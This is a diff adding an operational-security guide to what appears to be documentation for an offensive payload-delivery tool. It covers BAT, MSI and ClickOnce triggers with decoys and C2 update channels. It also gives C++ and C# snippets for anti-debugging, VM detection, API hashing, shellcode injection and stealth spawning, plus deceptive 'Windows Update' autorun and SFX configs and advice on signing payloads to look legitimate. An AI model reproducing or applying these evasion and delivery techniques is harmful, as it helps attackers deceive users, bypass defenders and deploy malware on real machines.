@@ -450,6 +450,510 @@ Command: C:\path\to\decoy.pdf
 
 **Recommendation**: Use system binaries as trigger binary to appear legitimate. Chain to decoy execution for user experience.
 
+### BAT (Batch Script) Triggers
+
+**Mechanism:**
+- Creates Windows batch script (.bat)
+- Executes commands through cmd.exe
+- Obfuscates complex command sequences
+
+**OPSEC Considerations:**
+- Batch script source visible to defenders
+- Execution traced in command line logs
+- Obfuscation needed for payload path/commands
+- Environment variables can hide paths
+- Timing delays controllable via batch syntax
+
+**Configuration:**
+- **Command**: Batch commands to execute
+- **Decoy**: Optional legitimate action to perform
+- **Delays**: Staged execution timing
+
+**Examples:**
+```batch
+@echo off
+setlocal enabledelayedexpansion
+start "" payload.exe
+timeout /t 2
+start "" decoy.pdf
+```
+
+**Recommendation**: Combine with legitimate batch logic, use environment variables for obfuscation, chain to decoy execution.
+
+### MSI (Windows Installer) Triggers
+
+**Mechanism:**
+- Integrates payload as custom action in MSI database
+- Executes during installation process
+- Appears as legitimate software installation
+
+**OPSEC Considerations:**
+- Elevated privileges possible (depends on scope)
+- Execution context can be SYSTEM or User
+- Installation process familiar to users
+- Progress/completion dialogs provide cover
+- Event logs contain installation records
+- Silent installation possible with proper parameters
+
+**Configuration:**
+- **Custom Action**: Payload execution method
+- **Scope**: User or Machine installation level
+- **Sequence**: When payload executes (InstallExecuteSequence)
+- **Conditions**: Trigger conditions (always, on repair, etc.)
+
+**Examples:**
+```
+Silent Installation:
+msiexec.exe /i setup.msi /quiet /qn
+
+Custom Action Execution:
+Payload runs during InstallFinalize phase
+Elevated privileges if installed to Machine scope
+```
+
+**Recommendation**: Use Machine scope for maximum privileges, name MSI as legitimate product, disable rollback to prevent uninstall.
+
+### ClickOnce Triggers
+
+**Mechanism:**
+- Leverages .NET ClickOnce deployment platform
+- Uses application manifests for code identity
+- Appears as legitimate application deployment
+
+**OPSEC Attack Surface:**
+- **Manifest Signing**: Can be unsigned or signed
+  - Unsigned: Easier to create, less legitimate appearance
+  - Signed: Requires code signing certificate, more legitimate
+  - Trusted publisher detection: SmartScreen learns URL reputation
+  
+- **Deployment Vector**: HTTP/HTTPS with manifest files
+  - Must be served via web server or shared network location
+  - Manifest files specify application assembly location
+  - Hash verification prevents tampering (if properly calculated)
+  
+- **Execution Context**: Runs as current user
+  - No privilege escalation built-in
+  - Inherits user token and permissions
+  - AppData isolated storage possible
+  
+- **Detection Vectors**:
+  - Deployment manifest (.application) files
+  - Application manifest (.exe.manifest) with assembly info
+  - Cached application files in LocalAppData\Apps
+  - Network traffic to manifest/assembly URLs
+  - Process execution with ClickOnce markers
+
+**Advanced ClickOnce Hardening:**
+
+1. **Manifest Hash Verification**:
+   - Manifests include SHA256 hashes of assemblies
+   - Tampering detection prevents modified payloads
+   - Proper calculation is critical for functionality
+   
+2. **Self-Updating Capability**:
+   - ClickOnce includes update checking
+   - Can check for updates on each execution
+   - Provides command & control capability
+   - Update checks go to specified update URL
+   
+3. **ClickOnce Cache Evasion**:
+   - Default cache location: `%LOCALAPPDATA%\Apps`
+   - Defender may scan cache during execution
+   - Cache cleanup on uninstall (if not prevented)
+   - Location is standard (easily discoverable)
+
+**Custom ClickOnce Hardening Approaches:**
+
+- **Manifest Signing**: Sign deployment manifests with legitimate certificate
+- **Custom Update Server**: Point update checks to command & control infrastructure
+- **Environmental Checks**: Include checks in manifests for analysis detection
+- **URL Spoofing**: Use URLs mimicking legitimate cloud services
+- **Cache Persistence**: Modify cache to persist across logout/login
+
+**Recommendation**: Use signed manifests with realistic publisher identity, configure update URL for command & control, combine with Code Signing strategy for maximum legitimacy.
+
+**Detection Evasion for ClickOnce:**
+- Sign manifests to bypass SmartScreen
+- Use custom update server for C2 integration
+- Reference legitimate-sounding assembly URLs
+- Configure cache retention policies
+- Disable rollback to prevent uninstall
+- Use custom injection method matching .NET environment
+
+---
+
+## Custom Hardening Guide
+
+### Loader-Level Hardening
+
+Custom modifications to C++ Shellcode Loader and .NET ClickOnce loader can significantly increase OPSEC and detection evasion:
+
+#### C++ Shellcode Loader Hardening
+
+**1. Anti-Analysis Detection**
+
+Add dynamic analysis detection before payload execution:
+
+```cpp
+// Check for debugger presence
+BOOL isDebugger = IsDebuggerPresent();
+if (isDebugger) {
+    // Exit gracefully or infinite loop
+    ExitProcess(1);
+}
+
+// Check for common analysis tools
+CHAR szPath[MAX_PATH];
+GetModuleFileNameA(NULL, szPath, MAX_PATH);
+if (strstr(szPath, "system32") == NULL) {
+    // Running from non-system location - likely analysis
+    ExitProcess(1);
+}
+
+// Check for VirtualBox/VMware
+LONG result = RegOpenKeyExA(HKEY_LOCAL_MACHINE, 
+    "SYSTEM\\CurrentControlSet\\Services\\VBoxGuest", 0, KEY_READ, NULL);
+if (result == ERROR_SUCCESS) {
+    ExitProcess(1);  // Running in VirtualBox
+}
+
+// Check for WMI-based VM detection
+IWbemServices *pSvc = NULL;
+// Attempt WMI connection and query BIOS info for VM signatures
+// If detected, exit
+```
+
+**2. ASLR and DEP Awareness**
+
+Ensure loader respects Address Space Layout Randomization:
+
+```cpp
+// Query kernel for ASLR availability
+UINT uAddressSpacing;
+GetProcessMitigationPolicy(GetCurrentProcess(), 
+    ProcessASLRPolicy, &uAddressSpacing, sizeof(uAddressSpacing));
+
+// When injecting, calculate relocations if payload uses relative addressing
+// ASLR means injected shellcode base address is not fixed
+if (uAddressSpacing) {
+    // Calculate offset between loaded address and expected base
+    DWORD dwOffset = (DWORD)pShellcode - EXPECTED_BASE;
+    // Apply relocations to shellcode if needed
+}
+```
+
+**3. Obfuscation of Loader Itself**
+
+Add code obfuscation to loader binary:
+
+```cpp
+// Use XOR or RC4 to obfuscate sensitive strings
+const BYTE obfuscatedKey[] = { 0xAB, 0xCD, 0xEF, ... };
+
+CHAR szTargetProcess[MAX_PATH];
+XorDecode(szTargetProcess, obfuscatedKey, encrypted_process_name);
+
+// Resolve Windows APIs dynamically to avoid import table
+typedef VOID* (*pCreateFileW)(LPCWSTR, DWORD, DWORD, SECURITY_ATTRIBUTES*, DWORD, DWORD, HANDLE);
+pCreateFileW CreateFileWPtr = (pCreateFileW)GetProcAddressX(
+    GetModuleHandleX("kernel32.dll"), "CreateFileW", obfuscatedKey);
+
+// Function resolution is traced back to string hashing instead of plain text
+DWORD HashApiName(const CHAR* szName) {
+    DWORD dwHash = 0;
+    while (*szName) dwHash = ((dwHash << 5) + dwHash) ^ *szName++;
+    return dwHash;
+}
+```
+
+**4. Custom Process Injection Variants**
+
+Beyond standard injection types, implement custom variants:
+
+```cpp
+// Variant 1: Indirect syscall injection (syscall-less)
+// Use legitimate APIs that internally call syscalls
+// Reduces direct syscall signature
+
+// Variant 2: Callback-based injection
+// Use window message callbacks or timer callbacks
+SetTimer(hwndTarget, 0, 0, (TIMERPROC)pShellcode);
+
+// Variant 3: COM-based injection
+// Use COM interfaces to execute code indirectly
+// Less monitored than direct injection
+
+// Variant 4: Exception handler injection
+// Set up vectored exception handlers that point to shellcode
+AddVectoredExceptionHandler(1, (PVECTORED_EXCEPTION_HANDLER)pShellcode);
+```
+
+**5. Stealth Spawning**
+
+Replace obvious `CreateProcessA/CreateProcessW` with stealthier alternatives:
+
+```cpp
+// Instead of CreateProcessW (heavily monitored):
+// Use WMI Process creation through COM
+CoCreateInstance(CLSID_WbemLocator, NULL, CLSCTX_ALL, 
+    IID_IWbemLocator, (void**)&pLocator);
+// Query Win32_Process class and call Create method
+
+// Or use ShellExecute with RUNAS verb for elevated spawning
+ShellExecuteEx(&ShExecInfo); // Avoids CreateProcessW hooks
+
+// Or use scheduled task creation for delayed execution
+ITaskService *pService = NULL;
+CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_ALL, 
+    IID_ITaskService, (void**)&pService);
+// Create task with embedded shellcode trigger
+```
+
+#### .NET ClickOnce Loader Hardening
+
+**1. Assembly Obfuscation**
+
+Apply obfuscation to .NET payload assembly:
+
+```csharp
+// Use reflection to dynamically load obfuscated methods
+Type type = Type.GetType("Namespace.ClassName", false, true);
+MethodInfo method = type.GetMethod("HiddenMethod", 
+    BindingFlags.NonPublic | BindingFlags.Static);
+object result = method.Invoke(null, parameters);
+
+// String encryption for sensitive values
+private static string DecryptString(byte[] encryptedData, string key) {
+    using (var aes = Aes.Create()) {
+        aes.Key = Encoding.UTF8.GetBytes(key);
+        // Decrypt and return
+    }
+}
+
+private static readonly string TargetProcess = DecryptString(new byte[] { ... }, "key");
+```
+
+**2. Reflection-Based API Invocation**
+
+Avoid direct P/Invoke which creates import tables:
+
+```csharp
+// Instead of: [DllImport("kernel32.dll")]
+// Use reflection and GetProcAddress
+
+public static IntPtr GetProcAddressByHash(string libraryName, uint apiHash) {
+    IntPtr hModule = LoadLibraryByName(libraryName);
+    IntPtr pFunc = IntPtr.Zero;
+    
+    // Enumerate exports and match by hash
+    foreach (var exportName in EnumerateModuleExports(hModule)) {
+        if (HashString(exportName) == apiHash) {
+            pFunc = GetProcAddress(hModule, exportName);
+            break;
+        }
+    }
+    return pFunc;
+}
+
+// Call functions dynamically
+IntPtr pCreateProcess = GetProcAddressByHash("kernel32.dll", 0x12345678);
+// Invoke through Marshal.GetDelegateForFunctionPointer
+```
+
+**3. ClickOnce-Specific Hardening**
+
+Leverage ClickOnce platform for evasion:
+
+```csharp
+// Access ClickOnce deployment info
+if (ApplicationDeployment.IsNetworkDeployed) {
+    // Determine if updates are available
+    // Can implement custom update checking to C2
+    UpdateCheckInfo info = ApplicationDeployment.CurrentDeployment.CheckForDetailedUpdate();
+    
+    // Abort if analysis environment detected
+    // Legitimate applications check for updates regularly
+    
+    // Store payloads in ClickOnce cache
+    string cacheDir = ApplicationDeployment.CurrentDeployment.DataDirectory;
+    // Files in cache persist across user logout
+}
+
+// Use ClickOnce configuration for persistence
+string dataDir = ApplicationDeployment.CurrentDeployment.DataDirectory;
+// Store agent executable here for service installation
+// Survives application uninstall if cache is retained
+```
+
+**4. Memory Protection**
+
+Use Windows memory protection mechanisms:
+
+```csharp
+// Mark memory regions as non-executable initially
+// Decrypt shellcode only when needed
+byte[] encryptedShellcode = ReadEmbeddedResource("payload.bin");
+byte[] decrypted = DecryptPayload(encryptedShellcode);
+
+// Allocate non-executable memory
+IntPtr pPayload = Marshal.AllocHGlobal(decrypted.Length);
+Marshal.Copy(decrypted, 0, pPayload, decrypted.Length);
+
+// Make executable only during injection
+VirtualProtect(pPayload, (uint)decrypted.Length, 0x40, out uint old); // PAGE_EXECUTE_READWRITE
+
+// Execute
+delegate_CreateFiber cfDelegate = (delegate_CreateFiber)Marshal.GetDelegateForFunctionPointer(
+    pCreateFiber, typeof(delegate_CreateFiber));
+
+// Restore to non-executable after injection
+VirtualProtect(pPayload, (uint)decrypted.Length, old, out uint _);
+```
+
+**5. Anti-Debugging Techniques**
+
+Add runtime checks to detect analysis:
+
+```csharp
+// Check for debugger
+if (Debugger.IsAttached) {
+    Environment.Exit(1);
+}
+
+// Check for common analysis tools via process list
+var processes = Process.GetProcesses();
+string[] suspiciousProcesses = { "ida64", "x32dbg", "x64dbg", "cheatengine", "procmon" };
+foreach (var proc in processes) {
+    if (suspiciousProcesses.Contains(proc.ProcessName.ToLower())) {
+        Environment.Exit(1);
+    }
+}
+
+// Check for debugging via PEB
+bool IsDebuggerPresent() {
+    IntPtr peb = GetPEB();
+    byte debugged = Marshal.ReadByte(IntPtr.Add(peb, 0x02));  // BeingDebugged flag
+    return debugged != 0;
+}
+```
+
+### Container-Level Hardening
+
+**1. MSI Custom Actions**
+
+Embed multiple execution paths in MSI:
+
+```xml
+<InstallExecuteSequence>
+    <!-- Condition-based execution -->
+    <Custom Action="ExecutePayload" After="InstallFinalize">
+        NOT REMOVE AND NOT Installed
+    </Custom>
+    
+    <!-- Alternative execution path for repair -->
+    <Custom Action="ExecutePayloadRepair" After="InstallFinalize">
+        REINSTALL OR UPGRADE
+    </Custom>
+</InstallExecuteSequence>
+
+<!-- Custom actions can execute executables, scripts, or DLLs -->
+<CustomAction Id="ExecutePayload" Return="ignore"
+    FileKey="PayloadExe" ExeCommand="-hidden" />
+```
+
+**2. ISO Autorun Obfuscation**
+
+Create deceptive autorun scenarios:
+
+```ini
+[autorun]
+; Windows displays this label
+label=Windows Update
+; Icons mimicking system icons
+icon=system32.dll,0
+
+; Multiple execution paths for system versions
+open=setup.exe
+openW98=legacy_setup.exe
+; This entry runs on shell context
+shell\install\command=powershell.exe -c "& '\Payload\run.exe'"
+```
+
+**3. Archive Self-Extraction**
+
+Use SFX (self-extracting) archives with execution logic:
+
+```ini
+; 7z SFX configuration for self-extracting archive
+Title="System Update"
+BeginPrompt="Installing system updates..."
+Progress=yes
+ExecuteFile=update.exe
+ExecuteParameters=/silent
+; Archives extract to temporary location and execute
+```
+
+### Code Signing Hardening
+
+**1. Timestamp Authorities**
+
+Use legitimate timestamp authorities in signatures:
+
+```powershell
+$cert = Get-ChildItem Cert:\CurrentUser\My | Where-Object { $_.Thumbprint -eq "ABC123..." }
+
+# Sign with timestamp authority to increase signature legitimacy
+Set-AuthenticodeSignature -FilePath "payload.exe" `
+    -Certificate $cert `
+    -TimestampServer "http://timestamp.verisign.com/scripts/timstamp.dll"
+    
+# Timestamps make signature appear more trustworthy
+# Signature remains valid even after certificate expiration (if timestamped)
+```
+
+**2. Multiple Signature Layers**
+
+Layer signatures for additional legitimacy:
+
+```powershell
+# First signature with organization certificate
+Set-AuthenticodeSignature -FilePath "payload.exe" -Certificate $orgCert
+
+# Optionally add a secondary counter-signature
+# Some scenarios require multiple signatures for compatibility
+```
+
+---
+
+## Recommended OPSEC Configurations by Scenario
+
+### **High-Risk Operation (Maximum Stealth)**
+- **Shellcode**: AES256_CBC + LZNT1 + ALPHA32
+- **Injection Method**: PoolParty (C++) or earlycascade (C#/.NET)
+- **Certificate**: Legitimate or highly-spoofed
+- **Container**: MSI with legitimate metadata
+- **Trigger**: MSI custom action with conditional execution
+- **Loader Hardening**: Full anti-analysis, memory protection, custom injection variants
+- **Additional**: Code signing with timestamp authority
+
+### **Medium-Risk Operation (Balanced Approach)**
+- **Shellcode**: AES256_CBC + LZNT1
+- **Injection Method**: NtMapViewOfSection (C++) or earlycascade (C#/.NET)
+- **Certificate**: Spoofed certificate matching context
+- **Container**: ZIP with password or MSI
+- **Trigger**: LNK with system binary or MSI
+- **Loader Hardening**: Anti-debugging, API obfuscation
+- **Additional**: Standard code signing
+
+### **Quick Deployment (Speed Priority)**
+- **Shellcode**: AES128_CBC + RLE
+- **Injection Method**: CreateFiber (C++) or createfiber (C#/.NET)
+- **Certificate**: Self-signed with realistic organization name
+- **Container**: ZIP without password
+- **Trigger**: BAT script or LNK
+- **Loader Hardening**: Minimal (focus on functionality)
+- **Additional**: Self-signed certificate only
+
 ---
 
 ## Detection Evasion Summary
